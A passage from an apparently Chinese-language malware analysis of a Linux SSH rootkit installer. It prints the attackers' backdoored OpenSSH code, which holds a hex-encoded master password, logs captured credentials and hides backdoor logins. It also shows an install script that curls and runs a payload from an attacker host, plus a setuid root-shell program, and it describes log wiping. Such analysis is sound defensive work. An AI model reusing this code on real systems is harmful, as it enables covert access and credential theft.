+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$rkdir&nbsp;;&nbsp;./run&nbsp;test&nbsp;$rk&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rktest&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rktest
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;test&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rktest).&nbsp;please&nbsp;manually&nbsp;check:&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rkdir/$rk/test-sshd&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;telnet&nbsp;127.0.0.1&nbsp;65535&nbsp;&nbsp;OR&nbsp;&nbsp;ssh&nbsp;root@127.0.0.1&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killall&nbsp;-9&nbsp;test-sshd&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;After&nbsp;checking,&nbsp;run&nbsp;the&nbsp;full&nbsp;install:&nbsp;./p2&nbsp;&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+
+
+
+fi</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们将会看到，默认版本中包含有OpenSSH的源代码，而其他版本中只包含有一些特定的二进制文件。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">举个例子，下面是ARMv6 tgz 文件，其中包括二进制文件集 sftp、scp ssh和sshd。</span></p><p style="white-space: normal; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;<img src="http://p3.qhimg.com/t0128799dea1ebc2ddc.png" title="t016f8433b87e85b6c5.png" alt="http://p2.qhimg.com/t016f8433b87e85b6c5.png"/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在系统默认情况下，该脚本将执行以下任务：</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·&nbsp;</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从&nbsp;http://gopremium.mooo.com/.../auto/default.tgz中下载一个文件</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;从http://gopremium.mooo.com/.../auto/p2中下载一个文件</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·&nbsp;</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">安装编译OpenSSH所需的程序库</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;执行default.tgz文件并编译一个自定义openssh 版本 (5.9)</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·&nbsp;</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">测试最新编译的SSHD 版本是否能够正常工作</span></p><p style="white-space: normal; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;<img src="http://p5.qhimg.com/t0156e7df7a44f67ef7.png" title="t0142db44b887c55e0e.png" alt="http://p3.qhimg.com/t0142db44b887c55e0e.png"/></span></p><p style="white-space: normal; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p0.qhimg.com/t0152010a0c5993c2e1.png" title="t01f2f269f3b178256e.png" alt="http://p6.qhimg.com/t01f2f269f3b178256e.png"/></span></p><p style="white-space: normal; text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p8.qhimg.com/t017d792e1bc1264370.png" title="t01e1502aed9db201e7.png" alt="http://p5.qhimg.com/t01e1502aed9db201e7.png"/></span></p><p style="white-space: normal; text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p1.qhimg.com/t016c53f8eccd0406f2.png" title="t0115f6bb319f5ea5b9.png" alt="http://p5.qhimg.com/t0115f6bb319f5ea5b9.png"/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">该脚本说明了测试这个新sshd的方法。</span></p><p style="white-space: normal; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;<img src="http://p0.qhimg.com/t01e13517c914b4315e.png" title="t01cc24a93e864586a9.png" alt="http://p0.qhimg.com/t01cc24a93e864586a9.png"/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下一步，该脚本会请求用户运行由p1脚本带出的p2脚本。这个脚本会正式安装SSHD的木马版本（覆盖默认操作系统的二进制文件）。但是在这之前，我要看一下default.tgz 文件中的 OpenSSH 源代码。</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">OpenSSH源代码的分析</span></strong></p><hr style="white-space: normal;"/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我要检查的第一个东西就是文件的时间戳。大部分文件显示的都是2011年，少部分文件显示的是2016年8月20日，所有我们可以从这些文件开始着手调查。</span></p><p style="white-space: normal; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;<img src="http://p5.qhimg.com/t01d37ee15d2354e349.png" title="t01171a5344890850cd.png" alt="http://p5.qhimg.com/t01171a5344890850cd.png"/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第一个文件，名为version.h，其中包含了一些很有趣的内容：</span></p><p style="white-space: normal; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;<img src="http://p5.qhimg.com/t01b7da7dd8edf9c557.png" title="t01257f17a4f1acf53f.png" alt="http://p8.qhimg.com/t01257f17a4f1acf53f.png"/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">默认 SSH 版本已经被更新到了6.0版本&nbsp;（但是&nbsp;OpenSSH 编译的代码是还是&nbsp;5.9 版本）。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">进一步分析，我在名为auth-passwd.c的文件中发现了更加有意思的东西：一个默认的后门密码，一些授予默认密码访问权限的代码和其他一些内容。</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:html;toolbar:false">SECRETPW[2]&nbsp;=&nbsp;0x74;
+SECRETPW[3]&nbsp;=&nbsp;0x65;
+SECRETPW[0]&nbsp;=&nbsp;0x50;
+SECRETPW[1]&nbsp;=&nbsp;0x52;
+SECRETPW[4]&nbsp;=&nbsp;0x73;
+SECRETPW[6]&nbsp;=&nbsp;0x44;
+SECRETPW[5]&nbsp;=&nbsp;0x74;
+&nbsp;
+ILOG[10]&nbsp;=&nbsp;0x70;
+ILOG[3]&nbsp;=&nbsp;0x63;
+ILOG[8]&nbsp;=&nbsp;0x2f;
+ILOG[7]&nbsp;=&nbsp;0x31;
+ILOG[0]&nbsp;=&nbsp;0x2f;
+ILOG[6]&nbsp;=&nbsp;0x31;
+ILOG[1]&nbsp;=&nbsp;0x65;
+ILOG[5]&nbsp;=&nbsp;0x58;
+ILOG[2]&nbsp;=&nbsp;0x74;
+ILOG[12]&nbsp;=&nbsp;0x00;
+ILOG[4]&nbsp;=&nbsp;0x2f;
+ILOG[9]&nbsp;=&nbsp;0x2e;
+ILOG[11]&nbsp;=&nbsp;0x72;
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!strcmp(password,&nbsp;SECRETPW))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;secret_ok=1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;sys_auth_passwd(authctxt,&nbsp;password);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(result){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((f=fopen(ILOG,&quot;a&quot;))!=NULL){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(f,&quot;%s:%s&nbsp;from&nbsp;%s\n&quot;,authctxt-&gt;user,&nbsp;password,&nbsp;get_remote_ipaddr());
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(file&nbsp;=&nbsp;fopen(&quot;/tmp/.unix&quot;,&nbsp;&quot;r&quot;))
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(file);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((f=fopen(ILOG,&quot;a&quot;))!=NULL){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(f,&quot;denied&nbsp;:&nbsp;%s:%s&nbsp;from&nbsp;%s\n&quot;,authctxt-&gt;user,&nbsp;password,&nbsp;get_remote_ipaddr());
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="white-space: normal; text-indent: 2em;"><br style="text-indent: 2em;"/><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;密码被存储在 SECRETPW 数组中，并且如果成功匹配，就会被授予访问权限。密码是以十六进制表示的。</span></p><pre class="brush:html;toolbar:false">&gt;&gt;&gt;&nbsp;&quot;50527465737444&quot;.decode(&quot;hex&quot;)&#39;PRtestD&#39;</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此外，在代码中有一个 ILOG 数组，代码会在之后的过程中将其作为文件来引用。使用 fopen 和参数 &#39;a&#39;可以打开这个文件，这就意味着该文件可以在末尾追加数据。文件中存储了相当多的数据：用户名、密码和远程IP。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">同样的，文件名也是十六进制形式。</span></p><pre class="brush:html;toolbar:false">&gt;&gt;&gt;&nbsp;&quot;2f6574632f5831312f2e707200&quot;.decode(&quot;hex&quot;)&#39;/etc/X11/.pr\x00&#39;</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用任意有效用户名和密码&#39;PRtestD都可以进入系统，但是用户记录并不会显示在系统命令中。然而如果使用正常的密码就不会发生这种情况，这似乎是某种Rootkit行为。<br style="text-indent: 2em;"/>&nbsp;&nbsp;/ etc/X11/.pr文件当中包含了所有已经成功登陆系统的用户名和密码。此外，文件中还包含了从主机中发出的所有SCP/SFTP/SSH连接。<br style="text-indent: 2em;"/>&nbsp;&nbsp;我在 sshlogin.c文件中发现了一些代码会检查输入的密码是否是后门密码。如果是的，就不会保存此次访问记录。这真的是隐藏访问的好办法。<br style="text-indent: 2em;"/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:html;toolbar:false">/*&nbsp;*&nbsp;Records&nbsp;that&nbsp;the&nbsp;user&nbsp;has&nbsp;logged&nbsp;in.&nbsp;&nbsp;I&nbsp;wish&nbsp;these&nbsp;parts&nbsp;of&nbsp;operating&nbsp;*&nbsp;systems&nbsp;were&nbsp;more&nbsp;standardized.&nbsp;*/voidrecord_login(pid_t&nbsp;pid,&nbsp;const&nbsp;char&nbsp;*tty,&nbsp;const&nbsp;char&nbsp;*user,&nbsp;uid_t&nbsp;uid,
+&nbsp;&nbsp;&nbsp;&nbsp;const&nbsp;char&nbsp;*host,&nbsp;struct&nbsp;sockaddr&nbsp;*addr,&nbsp;socklen_t&nbsp;addrlen)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;logininfo&nbsp;*li;
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;save&nbsp;previous&nbsp;login&nbsp;details&nbsp;before&nbsp;writing&nbsp;new&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;store_lastlog_message(user,&nbsp;uid);
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;li&nbsp;=&nbsp;login_alloc_entry(pid,&nbsp;user,&nbsp;host,&nbsp;tty);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login_set_addr(li,&nbsp;addr,&nbsp;addrlen);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!secret_ok&nbsp;||&nbsp;secret_ok!=1){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login_login(li);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login_free_entry(li);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+}
+...
+..
+/*&nbsp;Records&nbsp;that&nbsp;the&nbsp;user&nbsp;has&nbsp;logged&nbsp;out.&nbsp;*/void
+record_logout(pid_t&nbsp;pid,&nbsp;const&nbsp;char&nbsp;*tty,&nbsp;const&nbsp;char&nbsp;*user)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;logininfo&nbsp;*li;
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;li&nbsp;=&nbsp;login_alloc_entry(pid,&nbsp;user,&nbsp;NULL,&nbsp;tty);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!secret_ok&nbsp;||&nbsp;secret_ok!=1){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login_logout(li);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login_free_entry(li);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+}</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">脚本3（p2）：安装木马SSH工具</span></strong></span></p><hr style="white-space: normal;"/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">脚本p2的作用是将原来系统中的 SSH 二进制文件替换为木马版本。完整的脚本如下︰</span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:html;toolbar:false">#!/bin/bash##############&nbsp;RK&nbsp;full&nbsp;install&nbsp;(p2)
+#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;green#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;xxx&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+echo
+&nbsp;
+os=`cat&nbsp;1tempfiles/os.txt`
+rk=`cat&nbsp;1tempfiles/rk.txt`
+side_files_dir=`cat&nbsp;1tempfiles/side_files_dir.txt`
+maindir=`pwd`
+&nbsp;
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;full&nbsp;rk&nbsp;install&quot;&nbsp;#&nbsp;green
+rkdir=&quot;$maindir/$rk&quot;
+cd&nbsp;$rkdir&nbsp;;&nbsp;./run&nbsp;install&nbsp;$rk&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rkinstall&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rkinstall
+size_rk=`wc&nbsp;-c&nbsp;&lt;&nbsp;$rk/sshd-eu`
+size_sshd=`wc&nbsp;-c&nbsp;&lt;&nbsp;/usr/sbin/sshd`if&nbsp;[&nbsp;&quot;$size_rk&quot;&nbsp;!=&nbsp;&quot;$size_sshd&quot;&nbsp;]&nbsp;;&nbsp;then&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;something&nbsp;is&nbsp;wrong.&nbsp;aborting.&nbsp;check&nbsp;($maindir/1tempfiles/log.rkinstall)&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;install&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rkinstall)&quot;
+&nbsp;
+cd&nbsp;$maindir
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;downloading&nbsp;rkip&nbsp;install&nbsp;file&nbsp;(p3)&quot;&nbsp;#&nbsp;green
+rm&nbsp;-rf&nbsp;p3
+curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/p3if&nbsp;[&nbsp;!&nbsp;-f&nbsp;p3&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+chmod&nbsp;+x&nbsp;p3&nbsp;;&nbsp;./p3</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">该脚本会调用“运行”脚本，这是default.tgz 软件包的一部分，已经在脚本 2 (p1) 中用于测试 SSHD 的编译版本。</span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">它的功能主要如下：</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·&nbsp;</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">覆盖日志文件来删除入侵证据</span></p><p dir="ltr" style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:html;toolbar:false">/var/log/messages,&nbsp;/var/log/secure,&nbsp;/var/log/lastlog,&nbsp;/var/log/wtmp</pre><p dir="ltr" style="white-space: normal; text-indent: 2em;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·&nbsp;</span></strong><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">定义一个函数来更改已修改文件的时间戳。此函数是 luam_timestamp()</span><br/><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·&nbsp;</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">创建一个/etc/pps目录，用来保存之后会用到的文件。</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">·&nbsp;</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">创建一个/etc/X11/.pr文件，用来保存所有的用户名及密码。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>·</strong>编译一个&nbsp;goprem.c &nbsp;文件，用来收集本地根外壳代码。文件内容如下：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:html;toolbar:false">#include&nbsp;&lt;unistd.h&gt;int&nbsp;main(void)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setgid(0);&nbsp;setuid(0);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);&nbsp;}</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">最后用木马版本覆盖SSH二进制文件，并更改时间戳：</span><br/><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:html;toolbar:false">/usr/sbin/sshd,&nbsp;/usr/bin/ssh,&nbsp;/usr/bin/sftp,&nbsp;/usr/bin/scp</pre><p style="white-space: normal;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">脚本内容：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:html;toolbar:false">#!/bin/bash
